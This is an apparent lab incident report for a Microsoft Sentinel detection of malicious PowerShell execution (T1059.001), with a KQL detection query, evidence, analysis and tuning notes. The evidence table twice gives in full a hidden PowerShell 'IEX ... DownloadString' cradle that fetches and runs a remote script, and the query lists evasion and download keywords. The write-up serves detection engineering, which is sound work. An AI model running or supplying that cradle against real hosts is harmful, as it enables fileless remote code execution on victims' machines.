# Incident 02: Malicious PowerShell Execution (T1059.001)

## Summary
Sentinel detected a PowerShell process launched with common obfuscation/defense-evasion
flags and a network download cradle, consistent with MITRE ATT&CK technique
**T1059.001 - Command and Scripting Interpreter: PowerShell**.

## Incident Details
| Field | Value |
|---|---|
| Incident ID | 28 |
| Title | T1059.001 - Malicious PowerShell Execution |
| Severity | Medium |
| Status | Active |
| Category | Execution |
| MITRE ATT&CK | T1059, T1059.001 |
| Detection source | Scheduled detection (Microsoft Sentinel) |
| First activity | Sep 17, 2026, 4:34:45 AM |
| Last activity | Sep 17, 2026, 4:38:12 AM |
| Creation time | Sep 17, 2026, 5:22:38 AM |
| Active alerts | 1/1 |

## Affected Asset
- **Computer:** `vm-victim-01`
- **Account:** `vm-victim-01\azureuser`

## Detection Query
```kql
SecurityEvent
| where EventID == 4688
| where NewProcessName has_any ("powershell.exe", "pwsh.exe")
| where CommandLine has_any (
    "-enc", "-EncodedCommand", "-nop", "-noprofile",
    "-w hidden", "-windowstyle hidden",
    "IEX", "Invoke-Expression",
    "DownloadString", "DownloadFile",
    "-ExecutionPolicy Bypass"
  )
| project TimeGenerated, Computer, Account, NewProcessName, CommandLine, ParentProcessName
| order by TimeGenerated desc
```

## Evidence
Two matching events were captured within the incident window:

| TimeGenerated | Computer | Account | NewProcessName | CommandLine |
|---|---|---|---|---|
| Sep 17, 2026 4:34:45 AM | vm-victim-01 | vm-victim-01\azureuser | powershell.exe | `-nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('https://example.com/test.ps1')"` |
| Sep 17, 2026 4:38:12 AM | vm-victim-01 | vm-victim-01\azureuser | powershell.exe | `-nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('https://example.com/test.ps1')"` |

**Parent process:** `powershell.exe` (both events) — self-spawned in this simulation
rather than from a document/browser, since the attack was launched manually
from an existing PowerShell session on the victim VM.

**Key indicators present:**
- `-nop` (NoProfile) — skips loading the PowerShell profile to reduce noise/logging
- `-w hidden` (WindowStyle Hidden) — suppresses the console window
- `IEX` (Invoke-Expression) combined with `DownloadString` — a classic
  "download cradle" pattern used to fetch and execute remote payloads in memory
  without writing a file to disk

## Analysis
This pattern is a textbook fileless-execution technique: rather than downloading
a script to disk (which AV/EDR could scan), the payload is retrieved via
`Net.WebClient` and piped directly into `Invoke-Expression`, executing it purely
in memory under the hidden PowerShell process. The combination of `-nop`, `-w hidden`,
and the download cradle together are strong, low-false-positive indicators of
malicious intent rather than routine administration.

## Response Actions
1. Isolated finding to the lab VM `vm-victim-01` (simulated environment — no real
   lateral spread).
2. Confirmed `azureuser` was the executing account (matches expected simulation user).
3. Documented command line and process lineage for the detection engineering record.
4. Noted command-line auditing (`ProcessCreationIncludeCmdLine_Enabled`) was required
   to be enabled on the host for the `CommandLine` field to populate — without it,
   Event 4688 fires but with a blank command line, making this detection ineffective.

## Lessons Learned / Tuning Notes
- Command-line flags list is a starting set of common obfuscation/LOLBin indicators;
  expand as further testing reveals additional patterns.
- Requires command-line auditing enabled via registry (see `README.md` / lessons
  learned) — verify this is enabled on any new host before relying on this detection.
- Consider correlating `ParentProcessName` to flag PowerShell spawned from Office
  apps or browsers as higher-severity — not applicable in this simulation since
  the parent was PowerShell itself, but relevant for real-world tuning.
